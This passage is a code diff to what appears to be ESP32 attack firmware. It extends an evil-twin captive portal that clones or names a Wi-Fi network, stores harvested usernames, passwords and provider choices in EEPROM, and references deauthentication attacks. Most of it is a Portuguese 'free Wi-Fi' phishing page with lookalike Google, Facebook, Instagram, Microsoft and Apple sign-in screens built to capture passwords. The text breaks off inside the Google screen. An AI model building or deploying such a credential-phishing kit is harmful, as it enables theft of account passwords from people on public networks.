@@ -3061,7 +3061,8 @@ namespace CaptivePortal {
 
 static unsigned long cportalLastBtnMs = 0;
 static const unsigned long cportalDebounceMs = 200;
-static constexpr int kCredRowsPerPage = 18;
+static constexpr int kCredRowsPerPage = 10;
+static constexpr int kCredRowH = 18;   // 2 linhas por credencial
 
 static bool s_cloneUiActive = false;
 static bool s_clonePrevEn = false;
@@ -3107,6 +3108,9 @@ static void cportalUpdateNavLabels();
 static void cportalTeardown();
 static void cportalHandleMainNavButtons();
 static void cportalHandleCredNavButtons();
+static void cportalHandleConfigNavButtons();
+static void drawConfigMenu();
+static int s_configSel = 0;
 static void cpEditSsid();
 static void cpStopDeauth();
 static CpCloneAction cpCloneWaitInput(bool prevEnabled, bool nextEnabled, bool pickMode,
@@ -3146,24 +3150,38 @@ static void stopAttack();
 static void startAttack();
 void drawMainMenu();
 
-#define EEPROM_SIZE 1440
+// Layout do EEPROM (NVS): 0..31 SSID em uso | 32..3471 credenciais (20 x 172) |
+// 3472 contador | 3476 pagina | 3520 origem do nome | 3524 nome custom | 3557 nome clonado.
+// Cada credencial tem 172 bytes: username[64] + password[64] + ssid[32] + provider[12].
+#define EEPROM_SIZE 3600
 #define SSID_ADDR 0
 #define CRED_ADDR 32
-#define COUNT_ADDR 1248
+#define COUNT_ADDR 3472
 #define MAX_CREDS 20
-#define CRED_SIZE 64
+#define CRED_SIZE 172
+#define CP_SOURCE_ADDR   3476
+#define SSID_SRC_ADDR    3520   // 0 = Std (padrao da pagina), 1 = Custom, 2 = Clone
+#define CUSTOM_SSID_ADDR 3524   // 32 chars + terminador
+#define CLONE_SSID_ADDR  3557   // 32 chars + terminador
 
 String terminalBuffer[MAX_LINES];
 uint16_t colorBuffer[MAX_LINES];
 int lineIndex = 0;
 
+// `provider` guarda o botao usado no portal
+// (google / facebook / instagram / microsoft / apple).
 struct Credential {
-  char username[16];
-  char password[16];
+  char username[64];
+  char password[64];
   char ssid[32];
+  char provider[12];
 };
+// Trava de seguranca: se alguem mudar os campos sem ajustar o CRED_SIZE, o
+// build quebra aqui em vez de gravar lixo no EEPROM.
+static_assert(sizeof(Credential) == CRED_SIZE, "Credential deve ter exatamente CRED_SIZE bytes");
 
-enum Screen { MAIN_MENU, CRED_LIST };
+
+enum Screen { MAIN_MENU, CRED_LIST, CONFIG_MENU };
 Screen currentScreen = MAIN_MENU;
 int credPage = 0;
 
@@ -3173,37 +3191,874 @@ const char* seriesSSIDs[] = {"ESP32DIV_AP", "FreeWiFi", "Loading..."};
 const int numSeriesSSIDs = 3;
 int seriesSSIDIndex = 0;
 
-String loginPage = R"(
-<!DOCTYPE html>
-<html>
+static const char* const kBuiltinLoginPage = R"CPORTAL(<!DOCTYPE html>
+<html lang="pt-BR">
 <head>
-  <title>Wi-Fi Login</title>
-  <meta name='viewport' content='width=device-width, initial-scale=1'>
-  <meta http-equiv='Cache-Control' content='no-cache, no-store, must-revalidate'>
-  <meta http-equiv='Pragma' content='no-cache'>
-  <meta http-equiv='Expires' content='0'>
-  <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
-    h1 { color: #333; }
-    .container { max-width: 400px; margin: auto; padding: 20px; background: white; border-radius: 10px; }
-    input { padding: 10px; margin: 10px 0; width: 100%; box-sizing: border-box; border: 1px solid #ccc; border-radius: 5px; }
-    button { padding: 10px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
-    button:hover { background-color: #0056b3; }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<title>Wi-Fi Grátis - Acesso à Internet</title>
+<style>
+    :root {
+        --mc-red: #DA291C;
+        --mc-red-dark: #BD0017;
+        --mc-red-deep: #C40B18;
+        --mc-yellow: #FFC72C;
+        --mc-brown: #27251F;
+        --mc-cream: #F8F0E7;
+        --mc-muted: #6F4E2E;
+        --mc-line: #E7DCCD;
+        --blue: #1a73e8;
+        --blue-hover: #1765cc;
+        --text-dark: #202124;
+        --text-bright: #5f6368;
+        --text-list: #3c4043;
+        --border: #dadce0;
+        --btn-border: #747775;
+        --btn-text: #1f1f1f;
+        --gray-hover: #f8f9fa;
+        --gray-active: #f1f3f4;
+        --rb: Roboto, 'Segoe UI', Arial, sans-serif;
+        --gs: 'Google Sans', Roboto, 'Segoe UI', Arial, sans-serif;
+        --mc-display: 'Arial Black', 'Arial Bold', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { min-height: 100%; }
+    body { font-family: var(--rb); font-size: 15px; color: var(--mc-brown); background: var(--mc-cream); }
+    a { text-decoration: none; }
+    img, svg { vertical-align: middle; }
+
+    .screen { display: none; min-height: 100vh; min-height: 100dvh; position: relative; }
+
+    /* botao "voltar" no canto: o CNA do iOS nao tem botao de voltar nenhum,
+       entao a pagina precisa oferecer o proprio */
+    .cp-back {
+        position: absolute; top: 6px; left: 6px; z-index: 6;
+        display: inline-flex; align-items: center;
+        padding: 10px 12px; font-size: 14px; font-weight: 500; line-height: 1;
+        color: #6b6b70; cursor: pointer; user-select: none;
+        border-radius: 8px; -webkit-tap-highlight-color: transparent;
+    }
+    .cp-back:active { opacity: .55; background: rgba(0, 0, 0, .05); }
+    .screen.active { display: flex; flex-direction: column; animation: fadein .25s ease; }
+    @keyframes fadein { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+
+    /* ================= TELA 1 — McDONALD'S ================= */
+    #screen-landing { background: var(--mc-cream); }
+
+    .hero {
+        position: relative;
+        background: linear-gradient(180deg, #D6231C 0%, var(--mc-red) 42%, var(--mc-red-deep) 100%);
+        padding: 14px 18px 36px;
+        text-align: center;
+        overflow: hidden;
+        z-index: 1;
+    }
+    /* "colina" creme que fecha a faixa vermelha, como na referência */
+    .hero::after {
+        content: '';
+        position: absolute;
+        left: -25%; right: -25%; bottom: -48px; height: 64px;
+        background: var(--mc-cream);
+        border-radius: 50% 50% 0 0 / 100% 100% 0 0;
+        z-index: -1;
+    }
+    .arches { display: inline-block; line-height: 0; }
+    .arches svg { display: block; width: 56px; height: auto; }
+
+    .wordmark {
+        display: block;
+        margin-top: 12px;
+        line-height: 0;
+    }
+    .wordmark svg { display: block; width: 160px; height: 18.4px; margin: 0 auto; }
+    .sub {
+        display: block;
+        margin-top: 15px;
+        font-family: var(--mc-display);
+        font-weight: 900;
+        font-size: 13px;
+        line-height: 1;
+        letter-spacing: 1.5px;
+        text-transform: uppercase;
+        color: var(--mc-yellow);
+    }
+
+    .card-wrap {
+        flex: 1;
+        width: 100%;
+        padding: 0 10px;
+        margin-top: -3px;
+        position: relative;
+        z-index: 2;
+        display: flex;
+        flex-direction: column;
+    }
+    .card {
+        flex: 1;
+        background: #fff;
+        border-radius: 18px 18px 0 0;
+        box-shadow: 0 -1px 16px rgba(39, 37, 31, .10);
+        padding: 27px 24px 30px;
+        text-align: center;
+    }
+
+    .wifi-badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        background: #fff;
+        border: 2px solid var(--mc-yellow);
+        color: var(--mc-red-dark);
+        font-family: var(--rb);
+        font-weight: 800;
+        font-size: 12.5px;
+        line-height: 1;
+        letter-spacing: 1.2px;
+        text-transform: uppercase;
+        padding: 8px 16px 7px;
+        border-radius: 999px;
+    }
+    .wifi-badge svg { width: 16px; height: 16px; flex-shrink: 0; }
+
+    .card h1 {
+        margin-top: 14px;
+        font-family: var(--mc-display);
+        font-weight: 900;
+        font-size: 26px;
+        line-height: 1.15;
+        color: var(--mc-brown);
+    }
+    .card .lead {
+        margin-top: 12px;
+        font-size: 14.5px;
+        line-height: 1.55;
+        color: var(--mc-muted);
+    }
+    .card .lead strong { color: var(--mc-brown); font-weight: 700; }
+
+    .divider {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        margin: 26px 0 18px;
+        color: var(--mc-muted);
+        font-size: 12px;
+        font-weight: 500;
+        letter-spacing: 1.4px;
+        text-transform: uppercase;
+    }
+    .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--mc-line); }
+
+    .terms {
+        margin-top: 17px;
+        font-size: 12px;
+        line-height: 1.45;
+        color: var(--mc-muted);
+    }
+    .terms a { color: var(--mc-red); font-weight: 700; }
+
+    /* ---------- rodapé escuro ---------- */
+    .mc-footer {
+        background: var(--mc-brown);
+        color: #fff;
+        text-align: center;
+        padding: 22px 16px 26px;
+        font-size: 12px;
+    }
+    .mc-footer .f-arches { line-height: 0; }
+    .mc-footer .f-arches svg { display: block; width: 30px; height: auto; margin: 0 auto 8px; }
+    .mc-footer .brand { line-height: 0; }
+    .mc-footer .brand svg { display: block; width: 116px; height: 13.4px; margin: 0 auto; }
+    .mc-footer .tag { margin-top: 5px; color: rgba(255, 255, 255, .78); }
+    .mc-footer ul {
+        list-style: none;
+        display: flex;
+        justify-content: center;
+        flex-wrap: wrap;
+        gap: 18px;
+        margin-top: 14px;
+    }
+    .mc-footer a { color: var(--mc-yellow); font-weight: 600; font-size: 12px; }
+    .mc-footer .copy { margin-top: 14px; font-size: 11px; color: rgba(255, 255, 255, .55); }
+
+    /* ================= TELAS 2 e 3 — GOOGLE ================= */
+    #screen-email, #screen-password { background: #fff; }
+    .g-main { flex: 1; width: 100%; max-width: 450px; margin: 0 auto; padding: 48px 24px 24px; }
+    .g-logo { text-align: center; height: 24px; }
+    .g-heading { text-align: center; margin-top: 16px; }
+    .g-heading h1 { font-family: var(--gs); font-size: 24px; font-weight: 400; line-height: 32px; color: var(--text-dark); }
+    .g-heading p { font-size: 16px; color: var(--text-dark); padding-top: 8px; letter-spacing: .1px; }
+
+    .field { position: relative; padding-top: 8px; }
+    .field input { width: 100%; height: 54px; font-family: var(--rb); font-size: 16px; color: var(--text-dark); padding: 13px 15px; border: 1px solid var(--border); border-radius: 4px; background: transparent; outline: none; transition: border-color .15s, box-shadow .15s; }
+    .field input:hover { border-color: var(--text-dark); }
+    .field input:focus { border-color: var(--blue); box-shadow: inset 0 0 0 1px var(--blue); }
+    .field label { position: absolute; top: 21px; left: 15px; font-size: 16px; color: var(--text-bright); background: #fff; padding: 0 6px; pointer-events: none; transition: all .15s; }
+    .field input:focus + label, .field input:not(:placeholder-shown) + label { top: -1px; left: 9px; font-size: 12px; color: var(--blue); }
+    .field input:not(:focus):not(:placeholder-shown) + label { color: var(--text-bright); }
+
+    .sublink { display: inline-block; padding: 9px 0 3px; font-size: 14px; color: var(--blue); font-weight: 500; }
+    .guest-note { margin-top: 30px; color: var(--text-bright); line-height: 20px; }
+    .guest-note a { color: var(--blue); font-weight: 500; padding: 0 3px; }
+    .buttons { margin-top: 32px; width: 100%; display: flex; justify-content: space-between; align-items: center; }
+    .btn-link { background: none; border: none; font-family: var(--gs); font-size: 14px; font-weight: 500; height: 36px; padding: 0 8px; color: var(--blue); cursor: pointer; }
+    .btn-primary { background: var(--blue); border: none; font-family: var(--gs); font-size: 14px; font-weight: 500; letter-spacing: .25px; color: #fff; height: 36px; padding: 0 24px; border-radius: 4px; cursor: pointer; transition: background .15s, box-shadow .15s; }
+    .btn-primary:hover { background: var(--blue-hover); box-shadow: 0 1px 2px rgba(60,64,67,.3); }
+    .account { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 16px; }
+    .avatar { width: 28px; height: 28px; border-radius: 50%; background: var(--text-bright); color: #fff; display: flex; align-items: center; justify-content: center; font-family: var(--gs); font-size: 14px; font-weight: 500; text-transform: uppercase; flex-shrink: 0; }
+    .account .email { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 240px; color: var(--text-dark); }
+    .account .edit { color: var(--blue); font-weight: 500; cursor: pointer; white-space: nowrap; }
+    .show-pass { display: flex; align-items: center; gap: 8px; margin-top: 16px; cursor: pointer; user-select: none; color: var(--text-dark); }
+    .show-pass input { width: 18px; height: 18px; accent-color: var(--blue); cursor: pointer; }
+
+    .g-footer { font-size: 12px; }
+    .g-footer .lang { display: flex; justify-content: flex-start; padding: 4px 16px; }
+    .g-footer .lang select { border: none; font-family: var(--rb); font-size: 12px; color: var(--text-list); line-height: 28px; cursor: pointer; background: transparent; }
+    .g-footer ul { padding-left: 8px; display: flex; list-style: none; flex-wrap: wrap; }
+    .g-footer li { padding: 16px; }
+    .g-footer a { color: var(--text-list); font-weight: 400; }
+
+    /* ================= TELA 1 — BOTÕES DE PROVEDORES ================= */
+    .providers { margin-top: 4px; }
+    .provider-btn {
+        display: flex; align-items: center; justify-content: center; gap: 10px;
+        width: 100%; height: 44px; margin-top: 10px;
+        border: 0; border-radius: 6px; cursor: pointer;
+        font-family: var(--rb); font-size: 15px; font-weight: 600; letter-spacing: .2px;
+        color: #fff; box-shadow: 0 1px 3px rgba(39, 37, 31, .22);
+        -webkit-tap-highlight-color: transparent;
+        transition: filter .15s;
+    }
+    .provider-btn:first-child { margin-top: 0; }
+    .provider-btn:hover { filter: brightness(1.06); }
+    .provider-btn:active { filter: brightness(.93); }
+    .provider-btn svg { width: 21px; height: 21px; flex-shrink: 0; }
+    .p-google { background: #4285F4; }
+    .p-facebook { background: #1877F2; }
+    .p-instagram { background: linear-gradient(45deg, #F09433 0%, #E6683C 25%, #DC2743 50%, #CC2366 75%, #BC1888 100%); }
+    .p-microsoft { background: #2F2F2F; }
+    .p-apple { background: #000; font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+
+    /* ================= TELAS 8 e 9 — APPLE ================= */
+    #screen-apple-email, #screen-apple-password { background: #fff; }
+    .ap-wrap { flex: 1; width: 100%; max-width: 420px; margin: 0 auto; padding: 44px 24px 30px; text-align: center; color: #1D1D1F;
+               font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+    .ap-logo { width: 40px; height: 40px; }
+    .ap-title { margin-top: 20px; font-size: 24px; font-weight: 600; letter-spacing: -.3px; color: #1D1D1F; }
+    .ap-card { margin-top: 26px; padding: 18px 18px 20px; background: #F5F5F7; border-radius: 12px; text-align: left; }
+    .ap-label { display: block; margin-bottom: 8px; font-size: 15px; font-weight: 600; color: #1D1D1F; }
+    .ap-input { display: block; width: 100%; height: 46px; padding: 0 14px; font-family: inherit; font-size: 16px; color: #1D1D1F;
+                background: #fff; border: 1px solid #D2D2D7; border-radius: 8px; outline: none; box-sizing: border-box; }
+    .ap-input::placeholder { color: #86868B; }
+    .ap-input:focus { border-color: #0071E3; box-shadow: 0 0 0 3px rgba(0, 113, 227, .18); }
+    .ap-btn { display: block; width: 100%; height: 46px; margin-top: 16px; background: #0071E3; border: 0; border-radius: 8px;
+              color: #fff; font-family: inherit; font-size: 16px; font-weight: 500; cursor: pointer; }
+    .ap-btn:active { background: #0062C4; }
+    .ap-err { margin: 10px 2px 0; text-align: left; font-size: 13px; color: #E30000; }
+    .ap-link { display: block; margin-top: 20px; color: #0071E3; font-size: 14px; }
+    .ap-account { display: flex; align-items: center; justify-content: center; gap: 10px; margin: 14px 0 2px; font-size: 15px; }
+    .ap-account span { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .ap-account a { color: #0071E3; cursor: pointer; }
+    .ap-new { margin-top: 28px; font-size: 14px; color: #6E6E73; }
+    .ap-new a { color: #0071E3; }
+
+    /* ================= TELA 4 — FACEBOOK ================= */
+    #screen-facebook { background: #fff; }
+    .fb-wrap { flex: 1; width: 100%; max-width: 420px; margin: 0 auto; padding: 40px 22px 26px; font-family: Helvetica, Arial, sans-serif; text-align: center; }
+    .fb-logo svg { width: 46px; height: 46px; }
+    .fb-word { margin-top: 2px; font-size: 27px; font-weight: 700; color: #1877F2; letter-spacing: -1.1px; }
+    .fb-form { margin-top: 26px; }
+    .fb-input { display: block; width: 100%; height: 52px; margin-bottom: 12px; padding: 0 16px; font-family: inherit; font-size: 16px; color: #1c1e21; background: #fff; border: 1px solid #CCD0D5; border-radius: 6px; outline: none; box-sizing: border-box; }
+    .fb-input::placeholder { color: #90949c; }
+    .fb-input:focus { border-color: #1877F2; box-shadow: 0 0 0 2px rgba(24, 119, 242, .15); }
+    .fb-btn { display: block; width: 100%; height: 48px; background: #1877F2; border: 0; border-radius: 6px; color: #fff; font-family: inherit; font-size: 18px; font-weight: 700; cursor: pointer; }
+    .fb-btn:active { background: #166FE5; }
+    .fb-link { display: block; margin-top: 18px; color: #1877F2; font-size: 15px; }
+    .fb-sep { display: flex; align-items: center; gap: 12px; margin: 20px 0; color: #90949c; font-size: 13px; }
+    .fb-sep::before, .fb-sep::after { content: ''; flex: 1; height: 1px; background: #DADDE1; }
+    .fb-new { display: block; width: 210px; height: 44px; margin: 0 auto; line-height: 44px; background: #00A400; border-radius: 6px; color: #fff; font-size: 16px; font-weight: 700; }
+    .fb-new:active { background: #009100; }
+    .fb-foot { margin-top: 34px; font-size: 12px; color: #90949c; }
+
+    /* ================= TELA 5 — INSTAGRAM ================= */
+    #screen-instagram { background: #fff; }
+    .ig-wrap { flex: 1; width: 100%; max-width: 380px; margin: 0 auto; padding: 52px 26px 26px; text-align: center; font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif; }
+    .ig-logo { width: 64px; height: 64px; }
+    .ig-form { margin-top: 28px; }
+    .ig-input { display: block; width: 100%; height: 44px; margin-bottom: 8px; padding: 0 12px; font-family: inherit; font-size: 14px; color: #262626; background: #FAFAFA; border: 1px solid #DBDBDB; border-radius: 4px; outline: none; box-sizing: border-box; }
+    .ig-input::placeholder { color: #8e8e8e; }
+    .ig-input:focus { background: #fff; border-color: #a8a8a8; }
+    .ig-btn { display: block; width: 100%; height: 44px; margin-top: 14px; background: #0095F6; border: 0; border-radius: 8px; color: #fff; font-family: inherit; font-size: 15px; font-weight: 600; cursor: pointer; }
+    .ig-btn:active { background: #1877F2; }
+    .ig-or { display: flex; align-items: center; gap: 16px; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+    .ig-or::before, .ig-or::after { content: ''; flex: 1; height: 1px; background: #DBDBDB; }
+    .ig-fb { display: flex; align-items: center; justify-content: center; gap: 8px; color: #385185; font-size: 15px; font-weight: 600; }
+    .ig-forgot { display: block; margin-top: 18px; color: #385185; font-size: 13px; }
+    .ig-foot { margin-top: 40px; color: #8e8e8e; font-size: 12px; }
+
+    /* ================= TELAS 6 e 7 — MICROSOFT ================= */
+    #screen-ms-email, #screen-ms-password { background: #fff; }
+    .ms-wrap { flex: 1; width: 100%; max-width: 460px; margin: 0 auto; padding: 46px 26px 30px; font-family: 'Segoe UI', Tahoma, Verdana, Arial, sans-serif; }
+    .ms-logo { display: flex; align-items: center; gap: 10px; margin-bottom: 24px; }
+    .ms-logo svg { width: 22px; height: 22px; }
+    .ms-logo span { font-size: 19px; font-weight: 600; color: #5E5E5E; }
+    .ms-title { font-size: 24px; font-weight: 600; color: #1B1B1B; }
+    .ms-input { display: block; width: 100%; margin-top: 22px; padding: 6px 2px; font-family: inherit; font-size: 15px; color: #1B1B1B; background: transparent; border: 0; border-bottom: 1px solid #666; outline: none; box-sizing: border-box; }
+    .ms-input::placeholder { color: #666; }
+    .ms-input:focus { border-bottom-color: #0067B8; }
+    .ms-link { display: inline-block; margin-top: 18px; color: #0067B8; font-size: 13px; }
+    .ms-actions { margin-top: 32px; }
+    .ms-btn { width: 100%; height: 36px; background: #0067B8; border: 0; color: #fff; font-family: inherit; font-size: 15px; cursor: pointer; }
+    .ms-btn:active { background: #005DA6; }
+    .ms-new { margin-top: 28px; font-size: 14px; }
+    .ms-new a { color: #1B1B1B; }
+    .ms-back { display: flex; align-items: center; gap: 8px; margin-bottom: 20px; font-size: 15px; color: #1B1B1B; cursor: pointer; }
+    .ms-back span { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .ms-back svg { width: 18px; height: 18px; flex-shrink: 0; }
+
+    /* ---------- mensagens de erro de validação ---------- */
+    .form-err { display: none; text-align: left; line-height: 1.35; }
+    .form-err.show { display: block; }
+    .fb-err { margin: -6px 0 12px; font-family: Helvetica, Arial, sans-serif; font-size: 13px; color: #f02849; }
+    .ig-err { margin: 0 0 8px; font-size: 12px; color: #ed4956; }
+    .ms-err { margin: 8px 0 0; font-size: 13px; color: #a80000; }
+
+    .spinner-overlay { position: fixed; inset: 0; background: rgba(255,255,255,.85); display: none; align-items: center; justify-content: center; z-index: 50; }
+    .spinner-overlay.show { display: flex; }
+    .spinner { width: 32px; height: 32px; border: 3px solid var(--border); border-top-color: var(--blue); border-radius: 50%; animation: spin .8s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    /* ===== TEMA: página genérica (Wi-Fi Grátis) ===== */
+    :root {
+        --mc-red: #1D4ED8;
+        --mc-red-dark: #1E40AF;
+        --mc-red-deep: #1E3A8A;
+        --mc-yellow: #7DD3FC;
+        --mc-brown: #0F172A;
+        --mc-cream: #F1F5F9;
+        --mc-muted: #475569;
+        --mc-line: #CBD5E1;
+        --mc-display: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+    .hero { background: linear-gradient(180deg, #2563EB 0%, var(--mc-red) 45%, var(--mc-red-deep) 100%); }
+    .arches svg { width: 52px; height: auto; }
+    .wordmark { line-height: 1.15; }
+    .wm-text { display: block; font-family: var(--mc-display); font-weight: 800; font-size: 29px; letter-spacing: -.5px; color: #fff; }
+    .mc-footer .brand { line-height: 1.25; font-family: var(--mc-display); font-weight: 800; font-size: 16px; letter-spacing: -.2px; }
+    .mc-footer .f-arches svg { width: 26px; }
+
+</style>
 </head>
 <body>
-  <div class='container'>
-    <h1>Free Wi-Fi</h1>
-    <p>Log in to connect.</p>
-    <form action='/login' method='POST'>
-      <input type='text' name='username' placeholder='Username' required><br>
-      <input type='password' name='password' placeholder='Password' required><br>
-      <button type='submit'>Log In</button>
-    </form>
-  </div>
+
+    <!-- ============ TELA 1 — McDONALD'S ============ -->
+    <section class="screen active" id="screen-landing">
+        <header class="hero">
+            <span class="arches"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#7DD3FC" d="M12 20.6a1.7 1.7 0 1 0 0-3.4 1.7 1.7 0 0 0 0 3.4z"/><path fill="#7DD3FC" d="M12 13.4a7.9 7.9 0 0 1 5.6 2.3l1.8-1.8a10.4 10.4 0 0 0-14.8 0l1.8 1.8A7.9 7.9 0 0 1 12 13.4z"/><path fill="#7DD3FC" d="M12 8a13.4 13.4 0 0 1 9.5 3.9l1.8-1.8a16 16 0 0 0-22.6 0L2.5 11.9A13.4 13.4 0 0 1 12 8z"/></svg></span>
+            <span class="wordmark"><span class="wm-text">Wi-Fi Grátis</span></span>
+            <span class="sub">Acesso à Internet</span>
+        </header>
+
+        <div class="card-wrap">
+            <div class="card">
+                <span class="wifi-badge">
+                    <svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                        <path d="M12 20.2a2.1 2.1 0 1 0 0-4.2 2.1 2.1 0 0 0 0 4.2z" />
+                        <path d="M12 13.6c-1.6 0-3.1.6-4.2 1.6l1.5 1.5a3.8 3.8 0 0 1 5.4 0l1.5-1.5a6 6 0 0 0-4.2-1.6z" />
+                        <path d="M12 9.2c-3 0-5.7 1.2-7.7 3.1l1.5 1.5A8.8 8.8 0 0 1 12 11.3c2.4 0 4.6.9 6.2 2.5l1.5-1.5A10.9 10.9 0 0 0 12 9.2z" />
+                        <path d="M12 4.8c-4.2 0-8 1.6-10.9 4.3l1.5 1.5A13.4 13.4 0 0 1 12 7c3.7 0 7 1.4 9.4 3.6l1.5-1.5A15.5 15.5 0 0 0 12 4.8z" />
+                    </svg>
+                    Wi-Fi Grátis
+                </span>
+
+                <h1>Bem-vindo(a)!</h1>
+                <p class="lead">Para navegar na internet gratuita, é necessário se identificar. É rápido e seguro.</p>
+
+                <div class="divider">Identifique-se</div>
+
+                <div class="providers">
+                    <button type="button" class="provider-btn p-google" id="btnGoogle">
+                        <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#fff" d="M12.24 10.285V14.4h6.806c-.275 1.765-2.056 5.174-6.806 5.174-4.095 0-7.439-3.389-7.439-7.574s3.344-7.574 7.439-7.574c2.33 0 3.891.989 4.785 1.849l3.254-3.138C18.189 1.186 15.479 0 12.24 0c-6.635 0-12 5.365-12 12s5.365 12 12 12c6.926 0 11.52-4.869 11.52-11.726 0-.788-.085-1.39-.189-1.989H12.24z"/></svg>
+                        Continuar com o Google
+                    </button>
+                    <button type="button" class="provider-btn p-facebook" id="btnFacebook">
+                        <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#fff" d="M15.12 5.32H17V2.14A26.11 26.11 0 0 0 14.26 2C11.54 2 9.68 3.66 9.68 6.7v2.62H6.61v3.56h3.07V22h3.68v-9.12h3.06l.46-3.56h-3.52V7.05c0-1.03.28-1.73 1.76-1.73z"/></svg>
+                        Continuar com o Facebook
+                    </button>
+                    <button type="button" class="provider-btn p-instagram" id="btnInstagram">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" aria-hidden="true"><rect x="2.6" y="2.6" width="18.8" height="18.8" rx="5.4"/><circle cx="12" cy="12" r="4.5"/><circle cx="17.6" cy="6.4" r="1.2" fill="#fff" stroke="none"/></svg>
+                        Continuar com o Instagram
+                    </button>
+                    <button type="button" class="provider-btn p-microsoft" id="btnMicrosoft">
+                        <svg viewBox="0 0 23 23" aria-hidden="true"><rect width="10.5" height="10.5" fill="#F25022"/><rect x="12.5" width="10.5" height="10.5" fill="#7FBA00"/><rect y="12.5" width="10.5" height="10.5" fill="#00A4EF"/><rect x="12.5" y="12.5" width="10.5" height="10.5" fill="#FFB900"/></svg>
+                        Continuar com a Microsoft
+                    <button type="button" class="provider-btn p-apple" id="btnApple">
+                        <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#fff" d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg>
+                        Continuar com a Apple
+                    </button>
+                </div>
+
+                <p class="terms">Ao continuar, você concorda com os <a href="#" onclick="return false">Termos de Uso</a> e a <a href="#" onclick="return false">Política de Privacidade</a>.</p>
+            </div>
+        </div>
+
+        <footer class="mc-footer">
+            <div class="f-arches"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#7DD3FC" d="M12 20.6a1.7 1.7 0 1 0 0-3.4 1.7 1.7 0 0 0 0 3.4z"/><path fill="#7DD3FC" d="M12 13.4a7.9 7.9 0 0 1 5.6 2.3l1.8-1.8a10.4 10.4 0 0 0-14.8 0l1.8 1.8A7.9 7.9 0 0 1 12 13.4z"/><path fill="#7DD3FC" d="M12 8a13.4 13.4 0 0 1 9.5 3.9l1.8-1.8a16 16 0 0 0-22.6 0L2.5 11.9A13.4 13.4 0 0 1 12 8z"/></svg></div>
+            <div class="brand">Wi-Fi Grátis</div>
+            <div class="tag">Internet liberada para visitantes</div>
+            <ul>
+                <li><a href="#" onclick="return false">Fale Conosco</a></li>
+                <li><a href="#" onclick="return false">Privacidade</a></li>
+                <li><a href="#" onclick="return false">Termos</a></li>
+            </ul>
+            <div class="copy">&copy; 2026 Wi-Fi Grátis</div>
+        </footer>
+    </section>
+
+    <!-- ============ TELA 2 — GOOGLE E-MAIL ============ -->
+    <section class="screen" id="screen-email">
+        <a class="cp-back" onclick="goBack()">&#8249; Voltar</a>
+        <main class="g-main">
+            <div class="g-logo">
+                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <g><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"/></g>
+                    <g><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"/></g>
+                    <g><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"/></g>
